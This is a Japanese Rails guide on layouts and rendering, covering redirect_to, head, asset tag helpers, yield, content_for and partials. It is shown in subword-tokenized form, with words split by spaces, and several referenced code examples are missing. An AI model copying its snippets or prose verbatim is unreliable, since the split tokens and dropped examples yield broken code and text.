▁たとえば Proc オブジェクトを 渡す と 、 Proc を 渡 された ブロック には ` controller ` インスタンス が 渡 されます 。 これにより 、 現在の リクエスト を元に して レイアウト を 決 定 することができます 。
▁#### # ▁ 条件 付き レイアウト
▁ コントローラ レベル で 指定された レイアウト では 、`: only ` オプション と `: except ` オプション が サポート されています 。
▁これらの オプションは 、 単 一 の メソッド 名 または メソッド 名 の配列 を 引数として 受け 取り ます 。 渡す メソッド 名 は コントローラ 内の メソッド 名 に 対応 します 。
▁上の 宣言 によって 、` r s s ` メソッドと ` index ` メソッド 以外の すべての メソッド に ` product ` レイアウト が 適 用 されます 。
▁#### # ▁ レイアウト の 継 承
▁ レイアウト 宣言 は 下 の 階層 に 継 承 されます 。 下 の 階層 、 つまり より 具 体 的な レイアウト 宣言 は 、 上の 階層 、 つまり より 一般的な レイアウト よりも 常に 優 先 されます 。
▁* ▁` application _ controller . rb `
▁ layout ▁" main "
▁ layout ▁" special "
▁ layout ▁false
▁def ▁ show
▁render ▁ layout : ▁" ol d "
▁# ▁ ...
▁上の アプリケーション は 以下のように 動作します 。
▁* ▁ ビュー の 出力 には 基本的に ` main ` レイアウト が使用されます 。
▁#### ▁ 二 重 レンダリング エラー を避ける
▁Rails 開発 を や っ ていれば 、 一度 は ▁" C an ▁ only ▁render ▁ or ▁ redirect ▁on ce ▁ per ▁ action " ▁ エラー に 遭 遇 した こと がある でしょう 。
▁ い ま い ま しい エラー ですが 、 修正 は 比 較 的 簡単 です 。
▁この エラー は ほとんど の場合 、 開発者 が ` render ` メソッドの 基本的な 動作 を 誤 って 理解 している ことが 原 因 です 。
▁この エラー を 発生 する 以下のコード を 例 にとって 説明 しましょう 。
▁if ▁@ book . special ?
▁render ▁ action : ▁" special _ show "
▁render ▁ action : ▁" re g ul ar _ show "
▁ `@ book . special ?` が ` true ` の場合 、 Rails は レンダリング を 開 始 し 、 `@ book ` 変数 を ` special _ show ` ビュー に 転 送 します 。
▁しかし 、` show ` アクション のコードは そこで ▁ _ 止 ま らない _ ▁ ことにご注意ください 。 ` show ` アクション のコードは 最 終 行 まで 実行 され 、` re g ul ar _ show ` ビュー の レンダリング を 行 お う と した 時点 で エラーが発生し ます 。
▁ 解決 法 は いた って 単 純 です 。 1 つの コード 実行 パス 内で は 、` render ` メソッド や ` redirect ` メソッドの 実行 は 1 度 だけ に してください 。
▁ここで 非常に 便利な の が ` and ▁ return ` という メソッド です 。
▁この メソッドを使用して 修正 した バージョン を以下に示します 。
▁render ▁ action : ▁" special _ show " ▁and ▁ return
▁` & & ▁ return ` ではなく ` and ▁ return ` を使用して ください 。 ` & & ▁ return ` は Ruby 言語 の & & 演算子 の 優 先 順 位 が 高 す ぎ て この 文 脈 では 正常に動作し ません 。
▁Rails に ビルトイン されている ActionController が 行なう 暗 黙 の レンダリング では 、` render ` メソッドが 呼び出され た かどうかを確認 して から レンダリング を 開 始 します 。 従って 、 以下のコード は 正常に動作し ます 。
▁上のコードは 、 ある 本 が ` special ?` である 場合に のみ ` special _ show ` テンプレート を使用して 出力 します 。 それ以外の 場合は ` show ` テンプレート を使用して 出力 します 。
▁### ▁` redirect _ to ` を使用する
▁ HTTP リクエスト に レスポンス を返す もう 一 つの 方法は 、` redirect _ to ` を使用すること です 。
▁ 前 述 の とおり 、` render ` は レスポンス 構成 時に どの ビュー ▁( または 他の アセット ) ▁ を使用する か を指定する ためのものです 。
▁` redirect _ to ` メソッドは 、 この 点 において ` render ` メソッドと 根 本 的に 異なります 。 ` redirect _ to ` メソッドは 、 別の URL に対して 改 め て リクエストを 再 送信 する よう 、 ブラウザ に 指 令 を 出 す ためのものです 。
▁たとえば 以下の 呼び出し を行なう と 、 アプリケーションで 現在 どの ページ が表示され て いて も 、 写 真 の インデックス 表示 ページに リダイレクト されます 。
▁ redirect _ to ▁ photos _ url
▁` redirect _ to ` の 引数に は どんな 値 も 指定できます が 、` link _ to ` や ` url _ for ` を使用する のが普通です 。
▁ ユーザーを 直 前 の ページに 戻 す 、 特殊な リダイレクト も 行 え ます 。
▁ redirect _ to ▁: b ack
▁#### ▁ リダイレクト の ステータス コード を変更する
▁` redirect _ to ` を呼び出す と 、 一時 的な リダイレクト を 意味 する HTTP ステータス コード 30 2 が ブラウザ に 返 され 、 ブラウザ は それ に基いて リダイレクト を行います 。
▁ 別の ステータス コード ▁( 30 1 : ▁ 恒 久 的な リダイレクト が よく 使われ ます ) ▁ に変更 するには `: status ` オプション を使用します 。
▁ redirect _ to ▁ photos _ path , ▁ status : ▁ 30 1
▁` render ` の `: status ` オプション の場合 と同様 、` redirect _ to ` の `: status ` も ヘッダー を指定する 時に 数値 の 他 に シンボル も 使用できます 。
▁#### ▁` render ` と ` redirect _ to ` の違い
▁ とき お り 、` redirect _ to ` を 一 種 の ` g o to ` コマンド として 理解 している 開発 初心者 を見 かけ ます 。 Rails コードの 実行 位 置 を ある 場所 から 別の 場所 に 移動 する コマンド である と 考え ている わ け です 。
▁これは ▁ _ 正しく ありません _ ▁ 。
▁` redirect _ to ` を実行し た 後 、 コードは そこで 実行 を 終 了 し 、 ブラウザから の 次の リクエストを 待 ち ます ▁( 通常の ス タ ン バ イ 状態 )。
▁その 直 後 、` redirect _ to ` で ブラウザに送信 した HTTP ステータス コード 30 2 に従って 、 ブラウザから 別の URL への リクエスト が サーバー に 送信 され 、 サーバー は その リクエストを 改 め て 処理 します 。 それ以外の ことは 行 って いません 。
▁` render ` と ` redirect _ to ` の違い を 以下の アクション で 比 較 してみましょう 。
▁@ book ▁= ▁ Book . find _ by ( id : ▁ params [: id ] )
▁if ▁@ book . nil ?
▁render ▁ action : ▁" index "
▁上の フォーム のコード では 、 `@ book ` インスタンス変数 が ` nil ` 場合に 問題が生じ る 可能性があります 。
▁` render ▁: action ` は 対象 となる アクション のコード を実行し ない ことを思い出してください 。 従って 、` index ` ビューで おそらく 必要となる `@ books ` インスタンス変数 には 何も 設定 され ず 、 空 の 蔵 書 リスト が表示され てしまいます 。
▁これ を修正する 方法 の ひとつ は 、 render を redirect に変更 することです 。
▁ redirect _ to ▁ action : ▁: index
▁上のコード であれば 、 ブラウザから 改 め て index ページに リクエスト が 送信 される ので 、` index ` メソッドの コードが 正常に 実行されます 。
▁上のコード で 1 つ 残 念 な 点 がある と すれば 、 ブラウザ と の やりとり が 1 往 復 増え ること です 。 ブラウザから ` / books /1 ` に対して show アクション が 呼び出され 、 コントローラ が 本 が 1 冊 も ないこと を 検出 すると 、 コントローラ は ブラウザ に対して ステータス コード 30 2 ▁( リダイレクト ) ▁ レスポンス を返し 、` / books / ` に 再度 アクセス する よう ブラウザ に 指 令 を 出 します 。 ブラウザ はこの 指 令 に 応 じ 、 この コントローラの ` index ` アクション を呼び出す ための リクエストを 改 め て サーバー に 送信 します 。 そして コントローラ はこの リクエストを 受け て データベースから すべての 蔵 書 リスト を取り出し 、 index テンプレート を レンダリング して 出力結果 を ブラウザ に 送 り 返す と 、 ブラウザで 蔵 書 リスト が表示されます 。
▁この やりとり の 増 加 による 遅 延 は 、 小 規 模 な アプリケーション であれば おそらく 問題 になり ません が 、 遅 延 が 甚 だ しく な っ てきた 場合には この 点 を 改 め る 必要がある かもしれません 。
▁ ブラウザ と の やりとり を 増 や さ ないように 工 夫 した 例 を以下に示します 。
▁ flash . now [: alert ] ▁= ▁" Y our ▁ book ▁ w as ▁ not ▁f ound "
▁render ▁" index "
▁上のコード の動作 は 次の とおりです 。 指定された id を持つ 本 が 見つからない 場合は 、 モデル 内の すべての 蔵 書 リスト を `@ books ` インスタンス変数 に保存 します 。 続いて flash による 警 告 メッセージ を追加し 、 さらに ` index . html . erb ` テンプレート を直接 レンダリング して から 出力結果 を ブラウザ に 送 り 返します 。
▁### ▁` head ` で ヘッダ のみ の レスポンス を生成する
▁` head ` メソッド を使用することで 、 ヘッダ だけで 本 文 ▁( body ) ▁ の ない レスポンス を ブラウザに送信 できます 。
▁このメソッド 名 は ` render ▁: not h ing ` よりも 動作 を 明 確 に 表 しています 。
▁` head ` メソッド には 、 HTTP ステータス コードを 示す 多くの シンボル を 引数として 指定できます ▁( [ 参 照 テーブル ]( # status オプション ) ▁ 参 照 )。
▁ オプション の 引数 は ヘッダ 名 と 値を ペ ア に した ハッシュ 値 として 解 釈 されます 。
▁たとえば 、 以下のコード は エラー ヘッダー のみ の レスポンス を返す ことができます 。
▁ head ▁: b ad _ request
▁上のコード によって 以下の ヘッダー が 生成されます 。
▁ HTTP /1 . 1 ▁4 00 ▁B ad ▁ Request
▁ Date : ▁Sun , ▁2 4 ▁ J an ▁2010 ▁ 12 : 15 : 5 3 ▁ G M T
▁ Content - Type : ▁ text / html ; ▁ cha r set = u t f - 8
▁X - R un time : ▁ 0.0 1 3 4 8 3
▁ 以下のように 、 ヘッダー に 別の 情報 を含め る こともできます 。
▁ head ▁: created , ▁ location : ▁ photo _ path (@ photo )
▁上のコード の 結果 は以下のようになります 。
▁ HTTP /1 . 1 ▁20 1 ▁ Create d
▁ Date : ▁Sun , ▁2 4 ▁ J an ▁2010 ▁ 12 : 16 : 4 4 ▁ G M T
▁ L o c ation : ▁ / photos /1
▁X - R un time : ▁ 0.0 8 3 4 9 6
▁ レイアウト を構成する
▁Rails が ビュー から レスポンス を出力する ときに は 、 その ビュー には 現在の レイアウト も 組 み 込 まれ ます 。 現在の レイアウト を 探 索 する とき の ルール は 、 本ガイドで 既に 説明 した もの が使用されます 。
▁ レイアウト 内で は 、 さまざまな 出力 の 断 片 を 組み合わせ て 最終的な レスポンス 出力 を得る ための 3 つの ツール を 利用 できます 。
▁### ▁ アセット タグ ヘルパー
▁ アセット タグ ヘルパー が提供する メソッドは 、 フィード 、 JavaScript 、 スタイルシート 、 画像 、 動 画 および 音 声 の ビュー に リンク する HTML を生成する ためのものです 。
▁Rails では 以下の 6 つの アセット タグ ヘルパー が 利用 できます 。
▁これらの タグ は 、 レイアウト や 別の ビュー で使用する こともできます 。 こ のうち 、` auto _ d is co ver y _ link _ tag `、` javascript _ include _ tag `、` stylesheet _ link _ tag ` は レイアウト の ` < head > ` セクション で使用する のが普通です 。
▁WARN ING : ▁これらの アセット タグ ヘルパーは 、 指定 の 場所 に アセット がある かどうかを ▁ _ 検証 しません _ ▁ 。
▁#### ▁` auto _ d is co ver y _ link _ tag ` を使用して フィード に リンク する
▁` auto _ d is co ver y _ link _ tag ` ヘルパー を使用すると 、 多くの ブラウザ や フィード リ ー ダ ー で R S S フィード や A to m フィード を 検出 できる HTML が 生成されます 。
▁このメソッド が 受け 取 れる 引数 は 、 リンク の 種類 ▁( `: r s s ` または `: a to m ` ) 、 url _ for で 渡 される オプション の ハッシュ 、 および タグ の ハッシュ です 。
▁<%= ▁ auto _ d is co ver y _ link _ tag (: r s s , ▁ { action : ▁" feed "} ,
▁ { title : ▁" R S S ▁F e ed " }) ▁%>
▁` auto _ d is co ver y _ link _ tag ` では 以下の 3 つの タグ オプション が 使用できます 。
▁* ▁`: re l ` は リンク 内の ` re l ` 値 を指定します 。
▁ デフォルト値 は ▁" al ter n at e " ▁ です 。
▁* ▁`: type ` は M I M E タイプ を明示的に指定 したい場合 に 使用します 。
▁ 通常 、 Rails は 適切な M I M E タイプ を 自動的に 生成 します 。
▁* ▁`: title ` は リンク の タイトル を指定します 。
▁ デフォルト値 は `: type ` 値を 大文字 にしたもの です ▁( " A T O M " ▁ や ▁" R S S " ▁ など )。
▁#### ▁` javascript _ include _ tag ` を使用して JavaScript ファイルに リンク する
▁` javascript _ include _ tag ` ヘルパーは 、 指定された ソース ごとに HTML ▁` script ` タグを返します 。
▁Rails で [ アセットパイプライン ]( asset _ pipeline . html ) ▁ を有効に している 場合 、 JavaScript へのリンク 先 は 旧 Rails の ` public / javascripts ` ではなく ` / assets / javascripts / ` になります 。
▁ その後 この リンク は アセットパイプライン によって 利用 可能 になります 。
▁Rails アプリケーション 内 や Rails エンジン 内の JavaScript ファイルは 、` app / assets `、` lib / assets `、` vendor / assets ` のいずれか の 場所 に 置かれます 。
▁これらの 置き場所 の詳細については 、[ アセットパイプライン ガイド の 「 アセット の 編 成 」 ]( asset _ pipeline . html # アセット の 編 成 ) ▁ を参照してください 。
▁ 好 み に応じて 、 ドキュメント ルート から の 相 対 フル パス や URL を指定する こともできます 。
▁たとえば 、` app / assets `、` lib / assets ` 、 または ` vendor / assets ` の下に ある ` javascripts ` の下に ある JavaScript ファイルに リンク したい場合は 以下のように します 。
▁<%= ▁ javascript _ include _ tag ▁" main " ▁%>
▁上のコード により 、 以下のような ` script ` タグ が 出力 されます 。
▁< script ▁src =' / assets / main . js ' ></ script >
▁この アセット への リクエスト は 、 Sprockets ▁gem によって 提供され ます 。
▁ 複数の ファイル にアクセス したい場合 ▁( ` app / assets / javascripts / main . js ` と ` app / assets / javascripts / column s . js ` など ) ▁ は 以下のように します 。
▁<%= ▁ javascript _ include _ tag ▁" main ", ▁" column s " ▁%>
▁` app / assets / javascripts / main . js ` と ` app / assets / javascripts / photos / column s . js ` を含め たい場合は 以下のように します 。
▁<%= ▁ javascript _ include _ tag ▁" main ", ▁" / photos / column s " ▁%>
▁` http :// example . com / main . js ` を含め る には 以下のように します 。
▁<%= ▁ javascript _ include _ tag ▁" http :// example . com / main . js " ▁%>
▁#### ▁` stylesheet _ link _ tag ` を使用して CSS ファイルに リンク する
▁` stylesheet _ link _ tag ` ヘルパーは 、 提供され た ソース ごとに HTML ▁` < link > ` タグを返します 。
▁Rails で アセットパイプライン を有効に している 場合 、 この ヘルパーは ` / assets / stylesheets / ` へのリンク を生成します 。
▁ その後 この リンク は Sprockets ▁gem によって 処理 されます 。
▁ スタイルシート ファイルは 、` app / assets `、` lib / assets ` 、 または ` vendor / assets ` のいずれか の 場所 に 置かれます 。
▁ ドキュメント ルート から の 相 対 フル パス や URL を指定する こともできます 。
▁たとえば 、` app / assets `、` lib / assets ` 、 または ` vendor / assets ` の下に ある ` stylesheets ` の下に ある スタイルシート ファイルに リンク したい場合は 以下のように します 。
▁<%= ▁ stylesheet _ link _ tag ▁" main " ▁%>
▁` app / assets / stylesheets / main . css ` と ` app / assets / stylesheets / column s . css ` を含め る には 、 以下のように します 。
▁<%= ▁ stylesheet _ link _ tag ▁" main ", ▁" column s " ▁%>
▁` app / assets / stylesheets / main . css ` と ` app / assets / stylesheets / photos / column s . css ` を含め る には 以下のように します 。
▁<%= ▁ stylesheet _ link _ tag ▁" main ", ▁" photos / column s " ▁%>
▁` http :// example . com / main . css ` を含め る には 以下のように します 。
▁<%= ▁ stylesheet _ link _ tag ▁" http :// example . com / main . css " ▁%>
▁ デフォルトで は 、` stylesheet _ link _ tag ` によって 作成される リンク には ` media =" sc re en " ▁ re l =" stylesheet " ` という 属性 が含まれ ます 。
▁ 適切な オプション ▁( `: media ` , ▁`: re l ` ) ▁ を使用することで 、 これらの デフォルト値 を 上 書き できます 。
▁<%= ▁ stylesheet _ link _ tag ▁" main _ p r in t ", ▁ media : ▁" p r in t " ▁%>
▁#### ▁` image _ tag ` を使用して 画像 に リンク する
▁` image _ tag ` は 、 特定の ファイル を指す HTML ▁` < im g ▁/> ` タグ を生成します 。
▁ デフォルトで は 、 ファイルは ` public / images ` 以下 から 読み込まれ ます 。
▁WARN ING : ▁ 画像 ファイルの 拡張子 は 省略 できません 。
▁<%= ▁ image _ tag ▁" header . png " ▁%>
▁ 好 み に応じて 、 画像 ファイル への パス を直接 指定 することもできます 。
▁<%= ▁ image _ tag ▁" i con s / delete . g if " ▁%>
▁ ハッシュ 形式 で 与えられた HTML オプション を追加する こともできます 。
▁<%= ▁ image _ tag ▁" i con s / delete . g if ", ▁ { h e ig h t : ▁4 5 } ▁%>
▁ ユーザーが ブラウザで 画像 を 非 表示 に している 場合 、 alt 属性 の テキスト を表示する ことができます 。
▁ alt 属性 が 明示的に 指定 されていない 場合は 、 ファイル名 が alt テキスト として 使用されます 。 このとき ファイル名 の 先 頭 は 大文字 になり 、 拡張子 は 取り 除 か れ ます 。
▁たとえば 、 以下の 2 つの image _ tag ヘルパーは 同じ コード を返します 。
▁<%= ▁ image _ tag ▁" home . g if " ▁%>
▁<%= ▁ image _ tag ▁" home . g if ", ▁ alt : ▁" Home " ▁%>
▁" { 幅 } x { 高 さ } " という 形式 で 特殊な size タグ を指定する こともできます 。
▁<%= ▁ image _ tag ▁" home . g if ", ▁ size : ▁" 50 x 20 " ▁%>
▁上の 特 殊 タグ 以外に も 、`: class ` や `: id ` や `: name ` などの 標準的な HTML オプションを 最終的に ハッシュ にしたもの を 引数として 与え ることができます 。
▁<%= ▁ image _ tag ▁" home . g if ", ▁ alt : ▁" G o ▁ Home ",
▁id : ▁" Home I m age ",
▁class : ▁" n a v _ bar " ▁%>
▁#### ▁` video _ tag ` を使用して ビ デ オ に リンク する
▁` video _ tag ` ヘルパーは 、 指定された ファイル を指す HTML ▁5 ▁` < video > ` タグ を生成します 。
▁ デフォルトで は 、 ファイルは ` public / video s ` から 読み込まれ ます 。
▁<%= ▁ video _ tag ▁" m o v i e . o g g " ▁%>
▁上のコード によって 以下 が 生成されます 。
▁< video ▁src =" / video s / m o v i e . o g g " ▁/>
▁` image _ tag ` の場合 と同様 、 絶 対 パス または ` public / video s ` ディレクトリ から の 相 対 パス を 指定できます 。
▁さらに 、` image _ tag ` の場合 と同様に 、` size : ▁" # { 幅 } x # { 高 さ } " ` オプション を指定する こともできます 。
▁ ビ デ オ タグ では 、` id ` や ` class ` などの HTML オプションを 末尾 で 自由に 指定 することもできます 。
▁ ビ デ オ タグ では 、` < video > ` ▁ HTML オプションを 以下のような HTML オプション ハッシュ 形式 で 指定 することもできます 。
▁* ▁` post er : ▁" image _ name . png " ` は 、 ビ デ オ 再 生 前に ビ デ オ の 位 置 に 表示 しておき たい 画像 を指定します 。
▁* ▁` auto p la y : ▁true ` は 、 ページの 読み込み 時に ビ デ オ を 再 生 します 。
▁* ▁` lo o p : ▁true ` は 、 ビ デ オ を 最 後 まで 再 生 し 終わっ たら ル ー プ します 。
▁* ▁` control s : ▁true ` は 、 ブラウザ が提供する ビ デ オ 制 御 機能を 使用 できるようにします 。
▁* ▁` auto b u f f er : ▁true ` は 、 ページ 読み込み 時に すぐ 再 生 できるように ビ デ オ を 事 前に 読み 込 んで お きます 。
▁` video _ tag ` に ビ デ オ ファイル の配列 を 渡す ことで 、 複数の ビ デ オ を 再 生 することもできます 。
▁<%= ▁ video _ tag ▁[" tr a il er . o g g ", ▁" m o v i e . o g g "] ▁%>
▁上のコード によって 以下 が 生成されます 。
▁#### ▁` a u d io _ tag ` を使用して 音 声 ファイルに リンク する
▁` a u d io _ tag ` は 、 指定された ファイル を指す HTML ▁5 ▁` < a u d io > ` タグ を生成します 。
▁ デフォルトで は 、 これらの ファイルは ` public / a u d io s ` 以下 から 読み込まれ ます 。
▁<%= ▁a u d io _ tag ▁" m us i c . m p 3 " ▁%>
▁ 好 み に応じて 、 音 声 ファイル への パス を直接 指定 することもできます 。
▁<%= ▁a u d io _ tag ▁" m us i c / first _ s on g . m p 3 " ▁%>
▁`: id ` や `: class ` などの オプションを ハッシュ 形式 で 指定 することもできます 。
▁` video _ tag ` の場合 と同様 、` a u d io _ tag ` にも 以下の 特 殊 オプション があります 。
▁* ▁` auto p la y : ▁true ` は ページ 読み込み 時に 音 声 ファイルを 再 生 します 。
▁* ▁` control s : ▁true ` は 、 ブラウザ が提供する 音 声 ファイル 制 御 機能を 使用 できるようにします 。
▁* ▁` auto b u f f er : ▁true ` は 、 ページ 読み込み 時に すぐ 再 生 できるように 音 声 ファイルを 事 前に 読み 込 んで お きます 。
▁### ▁` yield ` を理解する
▁` yield ` メソッドは 、 レイアウト の コンテキスト で ビュー を 挿 入 すべき 場所 を指定する の に 使用します 。
▁` yield ` の 最も 単純な 使用 法 は 、` yield ` を 1 つ だけ 使用 して 、 現在 レンダリング されている ビュー の コンテンツ 全体 を その 場所 に 挿 入 する という ものです 。
▁` yield ` を行なう 領 域 を 複 数 使用する レイアウト を作成する こともできます 。
▁<%= ▁ yield ▁: head ▁%>
▁ ビュー の メ イン 部分 は 常に 「 名前 の ない 」 ` yield ` として レンダリング されます 。
▁ コンテンツ を 名前付き の ` yield ` として レンダリング するには 、` content _ for ` メソッド を使用します 。
▁### ▁` content _ for ` を使用する
▁` content _ for ` メソッド を使用することで 、 コンテンツ を 名前付き の ` yield ` ブロック として レイアウト に 挿 入 できます 。
▁たとえば 、 以下の ビュー の レンダリング 結果 は 上 で紹介した レイアウト 内に 挿 入 されます 。
▁<% ▁ content _ for ▁: head ▁do ▁%>
▁< title > A ▁ s im p le ▁ page </ title >
▁< p > Hello , ▁Rails !
▁この ページの レンダリング 結果 が レイアウト に 挿 入 される と 、 最終的に 以下の HTML が 出力 されます 。
▁< p > Hello , ▁Rails !
▁` content _ for ` メソッドは 、 たとえば レイアウト が 「 サイドバー 」 や 「 フ ッ ター 」 などの 領 域 に 分 か れ て いて 、 それら に 異なる コンテンツ を 挿 入 したい ような 場合に 大 変 便利です 。
▁ あるいは 、 多くの ページ で使用する 共通 の ヘッダー があり 、 この ヘッダー に 特定の ページ で のみ JavaScript や CSS ファイルを 挿 入 したい場合 にも 便利です 。
▁### ▁ パーシャル を使用する
▁ 部分 テンプレート は 通常 単 に パーシャル と 呼ばれ ます 。 パーシャル は 、 上 とは 異なる 方法で レンダリング 処理 を 扱 い やすい 単 位 に 分割 するための しく み です 。
▁ パーシャル を使用すると 、 レスポンス で 表示する ページの 特 定 部分を レンダリング するための コードを 別 ファイル に保存 しておく ことができます 。
▁#### ▁ パーシャル に 名前 を与える
▁ パーシャル を ビュー の一部 に含め て 出力 するには 、 ビュー 内で ` render ` メソッド を使用します 。
▁ レンダリング 中 の ビュー 内 に置かれている 上のコード は 、 その 場所 で ` _ me n u . html . erb ` という名前の ファイルを レンダリング します 。
▁上のコードは 、` app / views / shared / _ me n u . html . erb ` パーシャル の内容 を その 場所 で レンダリング します 。
▁#### ▁ シンプルな ビューで パーシャル を使用する
▁ パーシャル の 使用 方法 の 1 つ は 、 パーシャル を 一 種 の サブ ル ー チ ン のように み な す ことです 。 詳 細 な 表示 内容 を パーシャル 化 して ビュー から 追 い 出 し 、 コードを 読み や す く します 。
▁ 例 として 、 以下のような ビュー が あるとします 。
▁ TIP : ▁ すべての ページ で 共有 されている コンテンツ であれば 、 パーシャル を レイアウト で使用する ことができます 。
▁#### ▁ パーシャル レイアウト
▁ ビュー に レイアウト がある の と同様 、 パーシャル でも 独自の レイアウト ファイル を使用する ことができます 。
▁たとえば 、 以下のような パーシャル を呼び出す とします 。
▁<%= ▁render ▁ partial : ▁" link _ ar e a ", ▁ layout : ▁" gra y bar " ▁%>
▁上のコードは 、` _ link _ ar e a . html . erb ` という名前の パーシャル を探し 、` _ gra y bar . html . erb ` という名前の レイアウト を使用して レンダリング を行います 。
▁ パーシャル レイアウト は 、 対応する 通常の パーシャル と同様 、 名前 の 先 頭 に アンダースコア を 追加する必要があります 。 そして 、 パーシャル と それ に対応する パーシャル レイアウト は 同じ ディレクトリ に置く 必要があります 。 パーシャル レイアウト は ` layouts ` フォルダ ー には 置 け ません ので ご注意ください 。
▁`: layout ` などの 追加 オプションを 渡す 場合は 、`: partial ` オプション を明示的に指定 する 必要がある 点 にも ご注意ください 。
▁#### ▁ ローカル変数 を 渡す
▁ パーシャル に ローカル変数 を 引数として 渡 し 、 パーシャル を さらに 強 力 かつ 柔 軟 に することもできます 。
▁たとえば 、 new ページ と edit ページ の違い が ご く わずか しか ない のであれば 、 この 手法 を使用して コードの 重複 を 解 消 することができます 。
▁* ▁` new . html . erb `
▁< h 1> New ▁ zone </ h 1>
▁<%= ▁render ▁ partial : ▁" form ", ▁ local s : ▁ { zone : ▁@ zone } ▁%>
▁* ▁` edit . html . erb `
▁< h 1> Edit ing ▁ zone </ h 1>
▁* ▁` _ form . html . erb `
▁<%= ▁ form _ for ( zone ) ▁do ▁| f | ▁%>
▁< p >
▁< b > Z one ▁name </ b >< br >
▁<%= ▁f . text _ field ▁: name ▁%>
▁</ p >
▁< p >
▁<%= ▁f . submit ▁%>
▁上の 2 つの ビュー では 同じ パーシャル が レンダリング されます が 、 Action ▁ View の submit ヘルパーは new アクション の 場合には " Create ▁ Z one " を返し 、 edit アクション の場合は " U p date ▁ Z one " を返します 。
▁ どの パーシャル にも 、 パーシャル 名 から アンダースコア を 取り 除 いた 名前 を持つ ローカル変数 が与えられ ます 。
▁`: object ` オプション を使用することで 、 この ローカル変数 に オブジェクトを 渡す ことができます 。
▁<%= ▁render ▁ partial : ▁" customer ", ▁ object : ▁@ new _ customer ▁%>
▁上の ` customer ` パーシャル 呼び出し では 、` customer ` ローカル変数 は 親 の ビュー の `@ new _ customer ` 変数 を 指 します 。
▁ ある モデルの インスタンス を パーシャル として レンダリング する のであれば 、 以下のような 略 記 法 を使用できます 。
▁<%= ▁render ▁@ customer ▁%>
▁上のコードでは 、 `@ customer ` インスタンス変数 に ` Customer ` モデルの インスタンス が含まれ ている とします 。 この場合 レンダリング には ` _ customer . html . erb ` パーシャル が 使用 され 、 この パーシャル には ` customer ` ローカル変数 が 渡 されます 。 この ` customer ` ローカル変数 は 、 親 ビュー にある `@ customer ` インスタンス変数 を 指 します 。
▁#### ▁ コレクション を レンダリング する
▁ パーシャル は データ の 繰り返し ▁( コレクション ) ▁ を出力する 場合に も き わ め て 便利です 。
▁`: collection ` オプション を使用して パーシャル に コレクション を 渡す と 、 コレクション の メンバ ごとに パーシャル が レンダリング されて 挿 入 されます 。
▁* ▁` index . html . erb `
▁< h 1> Product s </ h 1>
▁<%= ▁render ▁ partial : ▁" product ", ▁ collection : ▁@ products ▁%>
▁* ▁` _ product . html . erb `
▁< p > Product ▁ Name : ▁<%= ▁ product . name ▁%></ p >
▁ パーシャル を呼び出す 時に 指定 する コレクション が 複数形 の場合 、 パーシャル の 個 別の インスタンス から 、 出力 する コレクション の 個 別の メンバ にアクセス が 行われます 。 このとき 、 パーシャル 名 に 基 づ いた 名前 を持つ 変数 が使用されます 。
▁上の 場合 、 パーシャル の名前 は ` _ product ` であり 、 この ` _ product ` パーシャル 内で ` product ` という名前の 変数 を使用して 、 出力 される インスタンス を 取得 できます 。
▁このメソッド には 略 記 法 もあります 。
▁ `@ products ` が ` product ` インスタンス の コレクション である と すると 、` index . html . erb ` に 以下のように 書くこと で 同じ 結果を 得られ ます 。
▁ 使用する パーシャル 名 は 、 コレクション 内の モデル名 に基いて 決 定 されます 。
▁ 実は 、 メンバ が 一 様 でない ▁( さまざまな 種類 の メンバ が 入 り 混 じ った ) ▁ コレクション にも 上の 方法 を使用できます 。 この場合 、 コレクション の メンバ に応じて 適切な パーシャル が自動的に 選択 されます 。
▁< h 1> Contact s </ h 1>
▁<%= ▁render ▁[ customer 1 , ▁ e m p lo y e e 1 , ▁ customer 2, ▁ e m p lo y e e 2 ] ▁%>
▁* ▁` customer s / _ customer . html . erb `
▁< p > Customer : ▁<%= ▁ customer . name ▁%></ p >
▁* ▁` e m p lo y e es / _ e m p lo y e e . html . erb `
▁< p > E m p lo y e e : ▁<%= ▁ e m p lo y e e . name ▁%></ p >
▁上のコードでは 、 コレクション の メンバ に応じて 、 customer パーシャル または e m p lo y e e パーシャル が自動的に 選択 されます 。
▁ コレクション が 空 の場合 、` render ` は nil を返します 。 以下のような 簡単な 方法 でも よい ので 、 代 わ り の コンテンツ を表示する ように しましょう 。
▁<%= ▁render (@ products ) ▁| | ▁" The re ▁are ▁ no ▁ products ▁ available . "
▁#### ▁ ローカル変数
▁ パーシャル 内の ローカル変数 を カスタマイズ したい場合は 、 パーシャル の 呼び出し 時に `: as ` オプション を指定します 。
▁<%= ▁render ▁ partial : ▁" product ", ▁ collection : ▁@ products , ▁as : ▁: item ▁%>
▁上の ように 変更 することで 、 `@ products ` コレクション の インスタンス に ` item ` という名前の ローカル変数 経由で アクセス できます 。
▁` local s : ▁ { } ` オプション を使用することで 、 レンダリング 中 の どの パーシャル にも 任意の 名前 の ローカル変数 を 渡す ことができます 。
▁<%= ▁render ▁ partial : ▁" product ", ▁ collection : ▁@ products ,
▁as : ▁: item , ▁ local s : ▁ { title : ▁" Product s ▁P age "} ▁%>
▁上の 場合 、` title ` という名前の ローカル変数 に " Product s ▁P age " という 値 が含まれ ており 、 パーシャル から この 値 にアクセス できます 。
▁ TIP : ▁ コレクション によって 呼び出される パーシャル 内で カ ウ ン タ 変数 を使用する こともできます 。 この カ ウ ン タ 変数 は 、 コレクション 名 の 後 ろ に ` _ counter ` を追加した 名前 になります 。
▁たとえば 、 パーシャル 内で `@ products ` を レンダリング した 回 数 を ` product _ counter ` 変数 で 参 照 できます 。
▁ただし 、 この オプションは ` as : ▁: value ` オプション と 併 用 できません 。
▁`: space r _ template ` オプション を使用することで 、 メ イン パーシャル の インスタンス と 交 互 に レンダリング される セ カ ンド パーシャル を指定する こともできます 。
▁上のコードでは 、` _ product ` パーシャル と ` _ product ` パーシャル の 合 間 に ` _ product _ r ul er ` パーシャル ▁( 引数 な し ) ▁ を レンダリング します 。
▁#### ▁ コレクション パーシャル レイアウト
▁ コレクション を レンダリング するときに も `: layout ` オプションを 指定できます 。
▁<%= ▁render ▁ partial : ▁" product ", ▁ collection : ▁@ products , ▁ layout : ▁" special _ layout " ▁%>
▁この レイアウト は 、 コレクション 内の 各 項目 を レンダリング する たびに 一 緒 に レンダリング されます 。
▁ パーシャル 内の 場合 と同様 、 この レイアウト でも 現在の オブジェクト と ( オブジェクト 名 ) _ counter 変数 を使用できます 。
▁### ▁ ネスト した レイアウト を使用する
▁ 特定の コントローラ を サポート するために 、 アプリケーションの 標準 レイアウト と の違い が ご く わずか しか ない ような レイアウト を 使い た くなる ことがあります 。
